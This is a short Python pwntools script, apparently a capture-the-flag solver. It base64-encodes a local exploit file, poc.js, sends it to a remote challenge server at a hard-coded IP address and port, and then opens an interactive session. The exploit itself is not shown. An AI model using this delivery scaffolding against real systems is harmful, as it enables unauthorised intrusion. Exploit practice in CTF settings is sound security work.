from pwn import *
import base64

with open('poc.js', 'rb') as f:
    exp = f.read()

# Encode to base64 as server expects
exp_b64 = base64.b64encode(exp).decode()  # decode to string for clean sending

context.log_level = 'debug'
io = remote('34.118.61.99', 10862)
# io = remote('localhost', 1337)

# io = process(['python3', 'server.py'])

io.sendlineafter(b':', exp_b64.encode())

io.interactive()